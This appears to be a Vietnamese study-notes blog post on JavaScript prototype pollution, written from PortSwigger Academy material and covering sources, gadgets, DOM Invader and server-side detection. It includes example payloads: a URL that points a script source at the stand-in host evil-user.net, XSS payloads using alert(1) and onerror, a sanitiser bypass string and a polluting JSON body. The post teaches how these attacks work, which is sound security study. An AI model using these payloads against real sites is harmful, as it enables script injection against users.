---
title: "Postswigger - Advanced topic - Prototype Polution exploit"
excerpt: "Prototype pollution là một lỗ hổng Javascript cho phép kẻ tấn công thêm các thuộc tính tùy ý vào các đối tượng prototype chung, sau đó có thể được kế thừa bởi các đối tượng do người dùng xác định."
header:
show_date: true
header:
  teaser: /assets/images/images-learn/Learn-2021-05-21-Prototype-poluttion/teaser.png
  teaser_home_page: true
  icon: /assets/images/images-icon/burpsuite-academy.png
  overlay_image: /assets/images/images-learn/Learn-2021-05-21-Prototype-poluttion/background.png
categories:
  - Learn
tags:
  - Learn
  - Vietnamese
  - Prototype-poluttion
---

# Prototype pollution là gì?
Prototype pollution là một lỗ hổng Javascript cho phép kẻ tấn công thêm các thuộc tính tùy ý vào các đối tượng prototype chung, sau đó có thể được kế thừa bởi các đối tượng do người dùng xác định.

![alt]({{ site.url }}{{ site.baseurl }}/assets/images/images-learn/Learn-2021-05-21-Prototype-poluttion/By2RxKXh2.png)

Mặc dù `prototype pollution` thường không thể khai thác được như một lỗ hổng độc lập, nhưng nó cho phép kẻ tấn công kiểm soát các thuộc tính của các đối tượng mà thông thường sẽ không thể truy cập được. 

Nếu ứng dụng xử lý thuộc tính do kẻ tấn công kiểm soát theo cách không an toàn, điều này tiềm ẩn khả năng xâu chuỗi lỗ hổng.
Vd: Trong Javascript phía client, điều này thường dẫn đế DOM XSS, trong khi prototype pollution phía server có thể dẫn tới RCE.
{: .notice--success}

## Javascript prototype và tính kế thừa
Javascript sử dụng một mô hình kế thừa dựa trên prototype(nguyên mẫu) khá khác biệt so với mô hình dựa trên `class` trong các ngôn ngữ khác. 
Trong phần này, chúng ta sẽ nói một cái nhìn tổng quan cơ bản về cách hoạt động của mô hình này, điều này sẽ đủ để hiểu về các lỗ hổng `prototype pollution`.

### Đối tượng trong Javascript là gì?
Một đối tượng Javascript về cơ bản chỉ là một tập hợp các cặp `key:value` được gọi là `thuộc tính`.
Ví dụ: đối tượng sau đại diện cho người dùng.
```js
const user =  {
    username: "wiener",
    userId: 01234,
    isAdmin: false
}
```

Ta có thể truy cập các thuộc tính của một đối tượng bằng cách sử dụng ký hiệu dấu chấm hoặc ký hiệu ngoặc vuông để chỉ các key tương ứng.
```js
user.username     // "wiener"
user['userId']    // 01234
```

Cũng giống như dữ liệu, các thuộc tính có thể chứa các hàm thực thi. Trong trường hợp này, hàm được gọi là `phương thức`.

```js
const user =  {
    username: "wiener",
    userId: 01234,
    exampleMethod: function(){
        // do something
    }
}
```

Các ví dụ ở trên là một Object theo nghĩa đen - là các object được tạo ra bằng cách sử dụng cú pháp dấu ngoặc nhọn để khai báo rõ ràng các thuộc tính và giá trị ban đầu của chúng. Tuy nhiên, quan trọng là ta phải hiểu rằng, hầu hết mọi thứ trong Javascript đều là một `đối tượng ngầm`.
{: .notice--info}

### Prototype trong Javascript là gì?
Mọi đối tượng trong Javascript được liên kết với một đối tượng khác thuộc loại nào đó - hay còn gọi là `nguyên mẫu (prototype)` của nó .

Mặc định, Javascript sẽ tự động gán cho các đối tượng mới một trong các nguyên mẫu tích hợp sẵn của nó. 
Ví dụ: Các chuỗi được tự động gán phần mở rộng `String.prototype`. 
{: .notice--info}


Một số ví dụ về prototype global:
```js
let myObject = {};
Object.getPrototypeOf(myObject);    // Object.prototype

let myString = "";
Object.getPrototypeOf(myString);    // String.prototype

let myArray = [];
Object.getPrototypeOf(myArray);     // Array.prototype

let myNumber = 1;
Object.getPrototypeOf(myNumber);    // Number.prototype
```
{: .notice--info}

Các đối tượng tự động kế thừa tất cả các thuộc tính của nguyên mẫu được chỉ định của chúng, trừ khi chúng có một thuộc tính riêng với cùng một khóa. Điều này cho phép các `dev` tạo ra các đối tượng mới có thể sử dụng lại các thuộc tính và phương thức của các đối tượng hiện có.
{: .notice--danger}

Các nguyên mẫu dựng sẵn cung cấp các thuộc tính và phương thức hữu ích để làm việc với các kiểu dữ liệu cơ bản. 
Ví dụ: đối tượng `String.prototype` có một phương thức `toLowerCase()` .Điều này cho phép: tất cả các chuỗi tự động có một phương thức sẵn sàng sử dụng để chuyển đổi chúng thành chữ thường. => Điều này giúp các nhà phát triển tiết kiệm việc phải thêm hành vi này theo cách thủ công vào từng chuỗi mới được tạo.

### Kế thừa đối tượng hoạt động như thế nào?
Bất cứ khi nào tham chiếu một thuộc tính của một đối tượng, trước tiên, Javascript sẽ cố gắng truy cập thuộc tính này trực tiếp trên chính đối tượng đó.

Nếu đối tượng không có thuộc tính phù hợp, công cụ Javascript sẽ tìm thuộc tính đó trên nguyên mẫu của đối tượng.
{: .notice--danger}

Với các đối tượng sau, `myObject.propertyA` cho phép tham chiếu:

![alt]({{ site.url }}{{ site.baseurl }}/assets/images/images-learn/Learn-2021-05-21-Prototype-poluttion/BJwxrodhn.png)

Bạn có thể sử dụng `console` trình duyệt của mình để xem hành vi này đang hoạt động. Đầu tiên, tạo một đối tượng hoàn toàn trống rỗng:

```js
let myObject = {};
```

Tiếp theo, nhập `myObject` cùng với dấu chấm. Lưu ý rằng bảng điều khiển sẽ nhắc bạn chọn từ danh sách các thuộc tính và phương thức:

![alt]({{ site.url }}{{ site.baseurl }}/assets/images/images-learn/Learn-2021-05-21-Prototype-poluttion/B1K_rodh2.png)


Mặc dù không có thuộc tính hoặc phương thức nào được xác định cho chính đối tượng, nhưng nó đã kế thừa một số thuộc tính hoặc phương thức tích hợp sẵn `Object.prototype`.
{: .notice--info}

### prototype chain

Nguyên mẫu của một Object chỉ là một đối tượng khác, đối tượng này cũng phải có nguyên mẫu của nó...
{: .notice--info}

Vì vậy hầu như mọi thứ trong Javascript đều là một `Object`.
chuỗi `Object.prototype` là đối tượng cấp cao nhất và nguyên mẫu là null.

![alt]({{ site.url }}{{ site.baseurl }}/assets/images/images-learn/Learn-2021-05-21-Prototype-poluttion/B1qNLju2h.png)

Điều quan trọng là các Object kế thừa các thuộc tính không chỉ từ nguyên mẫu trực tiếp của chúng mà còn từ tất cả các đối tượng phía trên chúng trong `prototype chain`
{: .notice--info}

Trong ví dụ trên, đối tượng `username` có quyền truy cập vào các thuộc tính và phương thức của cả 2 đối tượng `String.prototype` và `Object.prototype`.

### Truy cập nguyên mẫu của đối tượng bằng __proto__
Mỗi đối tượng có một thuộc tính đặc biệt mà ta có thể sử dụng để truy cập nguyên mẫu của nó. `__proto__` là tiêu chuẩn thực tế được sử dụng bởi hầu hết các trình duyệt.

Nếu đã quen thuộc với các ngôn ngữ hướng đối tượng, thì thuộc tính này có vai trò vừa là trình thu tập , vừa là trình thiết lập cho nguyên mẫu của đối tượng. Điều này nghĩa là bạn có thể sử dụng nó để đọc nguyên mẫu và các thuộc tính của nó, thậm chí gán lại giá trị cho chúng nếu cần.
{: .notice--info}

Như bất kỳ thuộc tính nào, có thể truy cập `__proto__` bằng ký hiệu dấu ngoặc hoặc dấu chấm
```js
username.__proto__
username['__proto__']
```

Cũng có thể xâu chuỗi các tham chiếu để `__proto__` thực hiện theo cách của mình trong chuỗi nguyên mẫu.
```js
username.__proto__                        // String.prototype
username.__proto__.__proto__              // Object.prototype
username.__proto__.__proto__.__proto__    // null
```

### Sửa đổi nguyên mẫu

Thông thường , điều này được coi là một cách làm không tốt, nhưng vẫn có thể sửa đổi các nguyên mẫu dựng sẵn trong Javascript giống như bất kỳ một đối tượng nào khác. Điều này có nghĩa là các phát triển có thể tùy ý chỉnh sửa hoặc ghi đè các phương thức tích hợp sẵn. Hoặc thêm các phương thức mới để thực hiện các thao tác khác.
{: .notice--info}

Ví dụ: Javascript hiện đại cung cấp phương thức `strim()` cho các chuỗi, cho phép dễ dàng xóa mọi khoảng trắng ở đầu hoặc cuối một chuỗi. Trước khi phương thức tích hợp sẵn này được giới thiệu, các nhà phát triển thường phải tùy chỉnh đối với đối tượng `String.prototype` bằng cách thực hiện sau:

```js
String.prototype.removeWhitespace = function(){
    // remove leading and trailing whitespace
}
```

Nhờ kế thừa nguyên mẫu, tất cả các chuỗi sau đó sẽ có quyền truy cập vào phương thức này:

```js
let searchTerm = "  example ";
searchTerm.removeWhitespace();    // "example"
```

# Lỗ hổng prototype pollution phát sinh như thế nào?
Các lỗ hổng ô nhiễm nguyên mẫu thường phát sinh khi một hàm Javascript hợp nhất theo cách đệ quy một đối tượng chứa các thuộc tính do người dùng kiểm soát vào một đối tượng hiện có mà không cần vệ sinh các phím trước. Điều này có thể cho phép kẻ tấn công đưa vào một thuộc tính bằng khóa `__proto__`, cùng với các thuộc tính lồng nhau tùy ý.

Do ý nghĩa đặc biệt của `__proto__` trong Javascript, thao tác hợp nhất có thể gán các thuộc tính lồng nhau cho nguyên mẫu của đối tượng thay vì chính đối tượng đích. Do đó, kẻ tấn công có thể làm ô nhiễm nguyên mẫu bằng các thuộc tính chứa các giá trị có hại, sau đó ứng dụng có thể sử dụng theo cách nguy hiểm.

Có thể làm ô nhiễm bất kỳ đối tượng nguyên mẫu nào, nhưng điều này thường xảy ra nhất với `Object.prototype`.
{: .notice--info}

Để khai thác thành công prototype pollution yêu cầu các thành phần chính sau:
- Nguồn gây ô nhiễm nguyên mẫu: Đây là bất kỳ đầu vào nào cho phép đầu độc các đối tượng nguyên mẫu bằng các thuộc tính tùy ý.
- sink: Hay còn gọi là hàm Javascript hoặc phần tử DOM cho phép thực thi mã tùy ý.
- gadget có thể khai thác: là bất kỳ thuộc tính nào được đưa vào sink mà không được lọc hoặc vệ sinh thích hợp.
{: .notice--danger}

## Nguồn ô nhiễm nguyên mẫu
Nguồn gây ô nhiễm nguyên mẫu là bất kì đầu vào nào do người dùng kiểm soát cho phép thêm các thuộc tính tùy ý vào các đối tượng nguyên mẫu. Các nguồn phổ biến nhất như:
```markdown
- URL thông qua truy vấn hoặc fragment string (hash)
- Đầu vào dựa trên JSON
- Tin nhắn web
```

### Ô nhiễm nguyên mẫu qua URL

Ví dụ về một URL, chứa chuỗi truy vấn do kẻ tấn công tạo ra:
```markdown
https://vulnerable-website.com/?__proto__[evilProperty]=payload
```
{: .notice--info}

Khi chia chuỗi truy vấn thành từng cặp `key:value` , trình phân tích cú pháp URL có thể hiểu `__proto__` là một chuỗi tùy ý.

Nhưng điều gì xảy ra nếu cặp `key:value` này được kết hợp vào một đối tượng đang có dưới dạng thuộc tính.

Ta có thể nghĩ rằng thuộc tính `__proto__` cùng với thuộc tính lồng nhau của nó là `evilProperty` sẽ chỉ được thêm vào đối tượng đích như dưới đây:
```js
{
    existingProperty1: 'foo',
    existingProperty2: 'bar',
    __proto__: {
        evilProperty: 'payload'
    }
}
```

Tuy nhiên, đây không phải. 

Tại một số điểm, hoạt động hợp nhất đệ quy có thể gán giá trị của `evilProperty` tương tự như sau:
```js
targetObject.__proto__.evilProperty = 'payload';
```

Trong quá trình này, công cụ Javascript coi `__proto__` như mọt trình khởi động cho nguyên mẫu. Kết quả là `evilProperty` được gán cho đối tượng nguyên mẫu được trả về thay vì chính đối tượng đích.
{: .notice--info}

Giả sử, đối tượng mục tiêu sử dụng giá trị mặc định `Object.prototype`, tất cả các đối tượng trong thời gian chạy Javascript giờ đây sẽ kế thừa `evilProperty`, trừ khi chúng đã có thuộc tính riêng của chúng trình với khóa .

Trong thực tế, việc tiêm một thuộc tính được gọi là `evilProperty` là không có tác dụng. Tuy nhiên, kẻ tấn công có thể sử dụng cùng một kỹ thuật để làm ô nhiễm nguyên mẫu bằng các thuộc tính được sử dụng bởi ứng dụng hoặc bất kỳ thư viện đã được import nào khác.
{: .notice--danger}

### Ô nhiễm nguyên mẫu thông qua JSON
Các đối tượng do người dùng điều khiển thường được lấy từ một chuỗi JSON bằng phương thức `JSON.parse()`. 
Thật thú vị, `JSON.parse` cũng coi bất kỳ khóa nào trong đối tượng JSON là một chuỗi tùy ý, bao gồm cả `__proto__` . Điều này cung cấp một vector tiềm năng khác cho ô nhiễm nguyên mẫu. 

Ví dụ:

Kẻ tấn công tiêm JSON độc hại sau qua một web messenge
```markdown
{
    "__proto__": {
        "evilProperty": "payload"
    }
}
```
{: .notice--info}

Nếu điều này được chuyển đổi thành một đối tượng Javascript thông qua phương thức `JSON.parse()`, thì trên thực tế, đối tượng kết quả sẽ có một thuộc tính với khóa `__proto__`:

```js
const objectLiteral = {__proto__: {evilProperty: 'payload'}};
const objectFromJson = JSON.parse('{"__proto__": {"evilProperty": "payload"}}');

objectLiteral.hasOwnProperty('__proto__');     // false
objectFromJson.hasOwnProperty('__proto__');    // true
```

Nếu đối tượng được tạo thông qua `JSON.parse()` sau đó hợp nhất vào đối tượng hiện có mà không làm sạch key thích hợp, thì điều này cũng sẽ dẫn đến ô nhiễm nguyên mẫu trong quá trình gán, nhưng chúng ta đã thấy trong ví dụ về URL.

## Sink
Ô nhiễm nguyên mẫu về cơ bản chỉ là một hàm Javascript hoặc phần tử DOM mà bạn có thể truy cập thông qua ô nhiễm nguyên mẫu, cho phép bạn thực thi các lệnh hệ thống hoặc JavaScript tùy ý. Chúng tôi đã đề cập đến một số dạng lỗ hổng phổ biến như DOM XSS.

Vì ô nhiễm nguyên mẫu cho phép kiểm soát các thuộc tính mà nếu không có thì không thể truy cập được, điều này có khả năng cho phép bạn tiếp cận một số phần bổ sung trong ứng dụng đích. Các nhà phát triển không quen với ô nhiễm nguyên mẫu có thể cho rằng người dùng không thể kiểm soát các thuộc tính này.

## Prototype pollution gadgets
Một gadget cung cấp một phương tiện để biến lỗ hổng ô nhiễm nguyên mẫu thành một khai thác thực tế.
Đây là một số yêu cầu:
- Được ứng dụng sử dụng theo cách không an toàn, chẳng hạn như chuyển nó vào `sink` mà không được lọc hoặc vệ sinh đúng cách.
- Kẻ tấn công có thể kiểm soát thông qua ô nhiễm nguyên mẫu. Nói một cách khác, đối tượng phải có khả năng kế thừa phiên bản độc hại của thuộc tính do kẻ tấn công thêm vào nguyên mẫu.

Một thuộc tính không được gọi là `gadget` nếu nó được xác định trực tiếp trên chính đối tượng đó. Trong trường hợp này, phiên bản thuộc tính riêng của đối tượng được ưu tiên hơn bất kỳ phiên bản độc hại nào mà bạn có thể thêm vào nguyên mẫu. Các trang web tốt thường đặt nguyên mẫu của Object thành `null`. 

Điều này đảm bảo rằng đối tượng hoàn toàn không kế thừa bất kỳ thuộc tính nào.
{: .notice--danger}

### Ví dụ: Gadget ô nhiễm nguyên mẫu
Có nhiều thư viện Javascript chấp nhận một đối tượng mà nhà phát triển có thể sử dụng để đặt các tùy chọn cấu hình khác nhau. Mã thư viện kiểm tra xem nhà phát triển có thêm một số thuộc tính nhất định vào đối tượng này một cách rõ ràng hay không và nếu có, điều chỉnh cấu hình cho phù hợp. Nếu không có thuộc tính đại diện cho một tùy chọn cụ thể, thì một tùy chọn mặc định được xác định trước thường được sử dụng để thay thế. Một ví dụ đơn giản hóa có thể trông giống nhưu sau:
```js
let transport_url = config.transport_url || defaults.transport_url;
```

Bây giờ hãy tưởng tượng code thư viện sử dụng dòng code `transport_url` để thêm tham chiếu tập lệnh vào trang.
```js
let script = document.createElement('script');
script.src = `${transport_url}/example.js`;
document.body.appendChild(script);
```

Nếu các nhà phát triển trang web, chưa đặt thuộc tính `transport_url` cho đối tượng `config` của họ, thì đây là một `gadget tiềm năng`. 

Trong trường hợp, kẻ tấn công có thể làm ô nhiễm `Object.prototype` bằng thuộc tính `transport_url` của riêng họ. Điều này sẽ được kế thừa bởi đối tượng `config` và được đặt làm `src` cho script này thành domain do kẻ tấn công chọn.
{: .notice--info}

Ví dụ: Nếu nguyên mẫu có thể bị ô nhiễm thông qua tham số truy vấn, thì kẻ tấn công chỉ cần dụ nạn nhân truy cập vào một URL được tạo đặc biệt để khiến trình duyệt của họ import tệp Javascript độc hại từ miền do kẻ tấn công kiểm soát
```markdown
https://vulnerable-website.com/?__proto__[transport_url]=//evil-user.net
```

Ngoài ra, bằng cách cung cấp một từ khóa `data:` trong url, kẻ tấn công cũng có thể nhúng trực tiếp một payload XSS trong chuỗi truy vấn sau:
```markdown
https://vulnerable-website.com/?__proto__[transport_url]=data:,alert(1);//
```

Lưu ý: `//` dùng để comment bypass phần còn lại của chuỗi.
{: .notice--danger}

# Lỗ hổng prototype pollution client
Trong phần này, ta tìm hiểu cách tìm các lỗ hổng gây ô nhiễm nguyên mẫu phía máy khác trong tự nhiên. Để củng cố hiểu biết của bạn về cách thức hoạt động của lỗ hổng bảo mật này. 
Chúng ta sẽ thực hiện thủ công và áp dụng của DOM Invader để tự động hóa phần lớn quy trình.

## Tìm source gây ô nhiễm thủ công

Việc tìm các source gấy ô nhiễm nguyên mẫu thường là một phép thử và đa số là không có hiệu quả.
Vì: Người kiểm thử cần dùng nhiều cách khác nhau để thêm một thuộc tính tùy ý cho `Object.prototype` cho tới khi tìm thấy một source hoạt động.
{: .notice--info}

Các bước khi kiểm tra lỗ hổng này phía client:
- Cố gắng thêm một thuộc tính tùy ý thông qua chuỗi truy vấn, đoạn URL và bất kỳ JSON input nào.


Ví dụ: `vulnerable-website.com/?__proto__[foo]=bar`
{: .notice--info}

- Trong console web, kiểm tra xem đối tượng `Object.prototype` đã bị ô nhiễm thành công với thuộc tính tùy ý chưa:


```js
Object.prototype.foo
// "bar" indicates that you have successfully polluted the prototype
// undefined indicates that the attack was not successful
```
{: .notice--info}

- Nếu thuộc tính không được thêm vào nguyên mẫu, hãy thử sử dụng các kỹ thuật khác:


Ví dụ: sử dụng dấu chấm thay vì dùng ký hiệu ngoặc vuông và ngược lại:
```markdown
vulnerable-website.com/?__proto__.foo=bar
```
{: .notice--info}

- Lặp lại quy trình này từng source tiềm năng

Nếu 2 cách trên đều không thành công, ta có thể làm ô nhiễm nguyên mẫu thông qua hàm tạo của nó. Đề cập sau.
{: .notice--danger}

## Tìm source ô nhiễm nguyên mẫu client sử dụng DOM Invader
Việc tìm lỗ hổng prototype pollution thủ công là một quá trình tẻ nhạt. Thay vào đó, ta có thể sử dụng `DOM Invader`, một công cụ được tích hợp sẵn của Burp.

DOM Invader có thể tự động kiểm tra các `source` gây ô nhiễm nguyên mẫu khi duyệt web, điều này có thể giúp tiết kiệm đáng kể thời gian và công sức.
{: .notice--info}

## Tìm các gadget gây ô nhiễm nguyên mẫu thủ công
Sau khi đã xác định được `source` cho phép thêm các thuộc tính tùy ý vào `Object.prototype`, bước tiếp theo là tìm một `gadget` phù hợp mà ta có thể sử dụng để tạo ra một khai thác. 

Trong thực tế, khuyến khích sử dụng DOM Invader để thực hiện việc này, nhưng cũng nên quan tâm quy trình thủ công để hiểu về lỗ hổng
{: .notice--danger}

1. Xem qua source và xác định bất kỳ thuộc tính nào được ứng dụng sử dụng hoặc bất kỳ thư viện nào mà ứng dụng import.
2. Trong Burp, bật tính năng `Proxy > Options > Intercept server responses` và chặn các phản hồi có chứa Javascript mà ta cần kiểm tra.
3. Thêm một câu lệnh `debugger` ở đầu script, sau đó chuyển tiếp mọi request và phản hồi còn lại.
4. Trong trình duyệt Burp, truy cập trang mà script đích được tải. Câu lệnh `debugger` tạm dừng việc thực thi tập lệnh.
5. Trong khi tập lệnh vẫn đang tạm dừng, hãy chuyển sang `console` và nhập lệnh dưới đây, thay thế `YOUR-PROPERTY` bằng một thuộc tính mà bạn cho là một `gadget` tiềm năng.
```js
Object.defineProperty(Object.prototype, 'YOUR-PROPERTY', {
    get() {
        console.trace();
        return 'polluted';
    }
})
```
Thuộc tính được thêm vào `Object.prototype` và trình duyệt sẽ ghi lại dấu vết vào console bất cứ khi nào nó được truy cập.
6. Nhấn nút để tiếp tục thực thi script và theo dõi bẳng console. Nếu dấu vết thực thi xuất hiện, điều này xác nhận rằng thuộc tính đã được truy cập ở đâu đó trong ứng dụng.
7. Mở rộng strace stack và sử dụng liên kết được cung cấp để chuyển đến dòng code mà thuộc tính đang được đọc.
8. Sử dụng các trình gỡ lỗi của trình duyệt, duyệt qua từng giai đoạn thực thi để xem liệu thuộc tính có được chuyển đến một `sink` hya không ví dụ: `innerHTML`, `eval()`
9. Lặp lại quy trình cho bất kỳ thuộc tính nào mà bạn coi là gadget tiềm năng.
{: .notice--danger}

## Tìm các gadget gây ô nhiễm nguyên mẫu phía clietn bằng DOM Invader
lmao! việc xác định thủ công các gadget gây ô nhiễm nguyên mẫu là một nhiệm vụ khó khăn. Do các trang web thường dựa vào một số thư viện của bên thứ ba, điều này có thể liên quan đến việc đọc qua hàng nghìn dòng code => phức tạp.

DOM Invader có thể thay mặt bạn tự động quét các gadget và thậm chí tạo một PoC DOM XSS trong một số trường hợp.
Tài liệu về [DOM Invader](https://portswigger.net/burp/documentation/desktop/tools/dom-invader/prototype-pollution#scanning-for-prototype-pollution-gadgets)
{: .notice--info}

## Ô nhiễm nguyên mẫu thông qua hàm tạo `constructor`
Cho tới nay, ta đã nói qua về cách ta có thể tham chiếu đến các đối tượng nguyên mẫu thông qua thuộc tính `__proto__`. Vì đây là kỹ thuật cổ điển để làm ô nhiễm nguyên mẫu, nên biện pháp bảo vệ phổ biến là loại bỏ bất kỳ thuộc tính nào có key `__proto__` khỏi các đối tượng do người dùng kiểm soát trước khi kết hợp chúng. 

Cách tiếp cận này thiếu sót vì có nhiều cách khác để tham chiếu tới `Object.prototype` mà không cần dựa vào `__proto__`
{: .notice--info}

Trừ khi nguyên mẫu của nó được đặt thành `null`. 
{: .notice--danger}

Mọi đối tượng Javascript đều có một thuộc tính `constructor` chứa tham chiếu đến hàm tạo được sử dụng để tạo ra chính đối tượng đó. 

Ví dụ: bạn có thể tạo một Object mới bằng cách sử dụng cú pháp bằng chữ hoặc bằng cách gọi hàm tạo `Object()` 
```js
let myObjectLiteral = {};
let myObject = new Object();
```
{: .notice--info}

Sau đó , ta có thể tham chiếu hàm tạo `Object()` thông qua thuộc tính tích hợp sẵn `constructor`:
```js
myObjectLiteral.constructor            // function Object(){...}
myObject.constructor                   // function Object(){...}
```

Nhớ rằng: các hàm cũng chỉ là các Object. Mỗi hàm tạo có một thuộc tính `prototype` trỏ đến nguyên mẫu sẽ được gán cho bất kỳ đối tượng nào được tạo ra bởi constructor đó. Do đó , bạn cũng có thể truy cập nguyên mẫu của bất kỳ đối tượng nào như sau:
```js
myObject.constructor.prototype        // Object.prototype
myString.constructor.prototype        // String.prototype
myArray.constructor.prototype         // Array.prototype
```
{: .notice--danger}

`myObject.constructor.prototype` tương đương với `myObject.__proto__`, vậy là ta có một vector mới :hugging_face: 
{: .notice--info}

## Bypass bộ lọc `__proto__`
Đương nhiên là các trang web sẽ được lập trình để bỏ qua lỗ hổng ô nhiễm nguyên mẫu. Điều đầu tiên họ nghĩ tới là làm sạch các key trước khi hợp nhất chúng vào một đối tượng hiện có. Tuy nhiên, một lỗi phổ biến là không làm sạch chuỗi đầu vào theo cách đệ quy. Ví dụ: xem xét URL sau:
```markdown
vulnerable-website.com/?__pro__proto__to__.gadget=payload
```

Nếu quy trình vệ sịnh chỉ tách chuỗi `__proto__` mà không lặp lại quy trình này nhiều lần, thì payload trên vẫn thành công gây ra ô nhiễm nguyên mẫu
```markdown
vulnerable-website.com/?__proto__.gadget=payload
```
{: .notice--info}

## Ô nhiễm nguyên mẫu trong các thư viện được import
Như đã đề cập, các gadget có thể xuất hiện trong các thư viện của bên thứ 2 được ứng dụng import vào. Trong trường hợp này, chúng tôi khuyên bạn nên sử dụng tính năng gây ô nhiễm của `DOM Invader` để xác định các source và gadget. Điều này không chỉ nhanh hơn mà còn đảm bảo không bỏ sót lỗi.

## Ô nhiễm nguyên mẫu via API browser (khó)
Có một số gadget gây ô nhiễm nguyên mẫu phổ biến trong API Javascript thường được cung cấp trong trình duyệt. 

### Prototype pollution via fetch()
API `fetch()` cung cấp một cách đơn giản để các nhà phát triển kích hoạt các HTTP request bằng Javascript. 
Phương thức `fetch()` chấp nhận 2 đối số:
- URL mà bạn muốn gửi request
- Một object tùy chọn cho phép kiểm soát Header request như method, body, ...

Ví dụ: 
```js
fetch('https://normal-website.com/my-account/change-email', {
    method: 'POST',
    body: 'user=carlos&email=carlos%40ginandjuice.shop'
})
```
{: .notice--info}

Trong trường hợp này, nếu kẻ tấn công tìm thấy một `source` phù hợp, chúng có khả năng gây ô nhiễm `Object.prototype` bằng chính các đối tượng cần thiết của `headers`.
Điều này sau đó có thể được kế thừa bởi đối tượng tùy chọn được truyền vào `fetch()` và sau đó được sử dụng để tạo request.

Ví dụ: Đoạn mã sau có khả năng dễ bị tấn công DOM XSS thông qua prototype pollution
```js
fetch('/my-products.json',{method:"GET"})
    .then((response) => response.json())
    .then((data) => {
        let username = data['x-username'];
        let message = document.querySelector('.message');
        if(username) {
            message.innerHTML = `My products. Logged in as <b>${username}</b>`;
        }
        let productList = document.querySelector('ul.products');
        for(let product of data) {
            let product = document.createElement('li');
            product.append(product.name);
            productList.append(product);
        }
    })
    .catch(console.error);
```

Khai thác:
Kẻ tấn công có thể gây ô nhiễm bằng cách thêm nội dung độc hại vào thuộc tính `x-username` của đối tượng `headers` như sau:
```js
?__proto__[headers][x-username]=<img/src/onerror=alert(1)>
```
{: .notice--info}


Giả sử, tiêu đề `x-username` được sử dụng để đặt giá trị cho biến `username` trong JSON trả về. Biến này sau đó được chuyển vào một `sink` `innerHTML` => DOM XSS
{: .notice--danger}

### prototype pollution via Object.defineProperty()
Với một dev chuyên nghiệp họ có thể cố gắng chặn các gadget tiềm bằng bằng cách sử dụng phương pháp `Object.defineProperty()`. Điều này cho phép bạn đặt thuộc tính không thể định cấu hình, không thể ghi trực tiếp lên đối tượng như sau:
```js
Object.defineProperty(vulnerableObject, 'gadgetProperty', {
    configurable: false,
    writable: false
})
```

Nghe thì có vẻ an toàn => tuy nhiên, phương pháp này vẫn có thiếu sót của nó.
{: .notice--danger}

Tương tự như `fetch()` , `Object.defineProperty()` cũng chấp nhận một Objetc tùy ý - hay còn gọi là `descriptor`. Như ví dụ trên. 
Trong một số ví dụ thực tế, dev có thể sử dụng đối tượng mô tả này để đặt giá trị ban đầu cho thuộc tính đang được xác định. Tuy nhiên, nếu lý do duy nhất mà họ xác định thuộc tính này là để bảo vệ chống prototype pollution, thì họ có thể không bận tâm đến việc thiết lập một giá trị nào cả.
{: .notice--info}


Trong trường hợp này, kẻ tấn công có thể vượt qua sự bảo vệ này bằng cách truyền value độc hại. Nếu đối tượng được mô tả này kế thường `Object.defineProperty()` thì giá trị do kẻ tấn công kiểm soát có thể được gán cho thuộc tính gadget.
{: .notice--danger}

# Prototype pollution phía server
Javascript cũng đã bắt đầu được sử dụng trong backend, chẳng hạn nhưu Node.js cực kỳ phổ biến, Javascript hiện được sử dụng rộng rãi để xây dựng máy chủ, API và các ứng dụng phụ trợ khác. Về mặt logic, điều này óc nghĩa là các lỗ hổng prototype pollution cũng có thể phát sinh phía máy chủ.

Ta sẽ tìm hiểu về một số kỹ thuật để phát hiện hộp đen ô nhiễm nguyên mẫu phía máy chủ. 

## Tại sao prototype pollution phía server khó phát hiện hơn
ô nhiễm nguyên mẫu phía máy chủ thường khó phát hiện hơn với client vì:
- Không có quyền truy cập mã nguồn: không có cái nhìn tổng quan về những `sink` hiện có hoặc các `gadget` tiềm năng
- Không có công cụ cho nhà phát triển: Javascript đang chạy trên một hệ thống từ xa, ta không thể biết được rằng lúc nào payload của chúng ta đã thành công.
- Sự cố Dos: Gây ô nhiễm các đối tượng trong môi trường phía máy chủ bằng cách sử dụng các thuộc tính thực thường làm hỏng chức năng của ứng dụng hoặc làm hỏng hoàn thàn máy chủ. 

Ngay cả khi phát hiện ra một lỗ hổng, việc khai thác nó cũng khó khăn vì về cơ bản là ta đã phá vỡ trang web trong quá trình này.
{: .notice--danger}
- Tình trạng ô nhiễm kéo dài: Khi thử phía client, ta chỉ cần làm mới trang thì ứng dụng sẽ quay lại như ban đầu, tuy nhiên trong client, thay đổi này sẽ tồn tại trong toàn bộ thời gian của quy trình Node và không thể đặt lại được.

Chúng ta sẽ đề cập tới một số kỹ thuật không pháp hủy cho phép kiểm tra prototype pollution phía server một cách an toàn.

## Phát hiện prototype pollution via phản ánh thuộc tính bị ô nhiễm

Một cái bẫy mà các dev dễ mắc phải là quên hoặc bỏ qua việc , trên thực tế một vòng lặp `for...in` Javascript lặp lại trên tất cả các thuộc tính có thể đếm được của một đối tượng, bao gồm cả những thuộc tính mà nó đã kế thừa qua `prototype chain`.

Điều này, không bao gồm các thuộc tính tích hợp được thiết lập bởi các hàm constructor của Javascript vì các thuộc tính này không thể đếm được theo mặc định.
{: .notice--info}

Bạn có thể tự kiểm tra điều này như sau:

```js
const myObject = { a: 1, b: 2 };

// gây ô nhiễm nguyên mẫu với một thuộc tính tùy ý
Object.prototype.foo = 'bar';

// xác nhận `myObject` không có thuộc tính riêng `foo`
myObject.hasOwnProperty('foo'); // false

// liệt kê tên của các thuộc tính của myObject
for(const propertyKey in myObject){
    console.log(propertyKey);
}

// Output: a, b, foo
```

Điều này cũng được áp dụng cho các mảng, trong đó một vòng lặp `for...in` đầu tiên lặp lại trên mỗi chỉ mục, về cơ bản chỉ là một khóa thuộc tính , trước khi chuyển sang bất kỳ thuộc tính kế thừa nào.

```js
const myArray = ['a','b'];
Object.prototype.foo = 'bar';

for(const arrayKey in myArray){
    console.log(arrayKey);
}

// Output: 0, 1, foo
```

Trong cả hai trường hợp, nếu ứng dụng sau đó bao gồm các thuộc tính được trả về trong phản hồi, điều này có thể cung cấp một cách đơn giản để thăm dò ô nhiễm nguyên mẫu phía máy chủ.

các request `POST` và `PUT` gửi JSON là một trong những vị trí chính cho loại hành vi này vì thông thường server sẽ phản hồi bằng một JSON của đối tượng mới hoặc đối tượng được cập nhật. 

Ta có thể khai thác như sau:
```js
POST /user/update HTTP/1.1
Host: vulnerable-website.com
...
{
    "user":"wiener",
    "firstName":"Peter",
    "lastName":"Wiener",
    "__proto__":{
        "foo":"bar"
    }
}
```

